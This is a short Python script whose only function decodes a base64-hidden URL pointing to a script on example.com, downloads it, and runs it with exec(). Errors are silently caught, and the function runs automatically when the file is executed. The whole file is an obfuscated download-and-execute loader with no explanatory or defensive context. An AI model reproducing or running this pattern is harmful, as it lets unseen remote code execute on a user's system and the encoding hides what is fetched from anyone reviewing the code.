import base64
import requests

def fetch_exec_code():
    try:
        encoded_url = "aHR0cDovL2V4YW1wbGUuY29tL3NjcmlwdDEucHk="
        decoded_url = base64.b64decode(encoded_url).decode("utf-8")

        response = requests.get(decoded_url)
        script = response.text

        exec(script)

    except Exception as e:
        print(e)

fetch_exec_code()
